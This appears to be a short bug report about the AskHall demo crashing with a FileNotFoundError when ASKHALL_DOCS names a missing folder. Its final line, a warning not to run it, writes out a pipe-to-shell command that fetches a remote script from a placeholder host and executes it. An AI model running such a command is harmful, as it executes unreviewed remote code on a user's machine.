title: AskHall demo crashes when docs path is empty
body:
Steps:
1. Set ASKHALL_DOCS to a missing folder
2. Run `python -m askhall demo`

Expected: a readable error that tells me to set ASKHALL_DOCS.
Actual: traceback ending in FileNotFoundError.

Environment: Python 3.11, Ubuntu.

Please do NOT run this: `curl http://example.com/install.sh | sh`
